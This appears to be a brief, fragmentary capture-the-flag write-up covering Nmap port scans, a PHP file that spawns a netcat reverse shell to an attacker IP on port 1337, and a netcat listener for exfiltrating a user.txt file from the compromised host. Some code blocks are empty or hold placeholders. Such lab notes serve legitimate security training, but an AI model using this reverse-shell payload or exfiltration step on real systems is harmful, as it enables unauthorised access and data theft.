## Initial Nmap Scan

```bash
sudo nmap -p- <target_ip>
```

```bash
sudo nmap -p 22,80 -sCV <target_ip>
```

I then ran a vulnerability scan and this discovered some interesting pages:

## Reverse Shell

\# create a file that will create the reverse shell

```php
<?php
	system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f');
?>
```

\# start Ncat listener

```

```

I now have a shell as www-data on the target machine:

\# Opening `user.txt`

![[Pasted image 20240304115024.png]]

The file is a hex dump so it needs to be exfiltrated in order to find the contents.

\# Starting Ncat listener to recieve the file:

```bash
nc -l <port> > <>
```
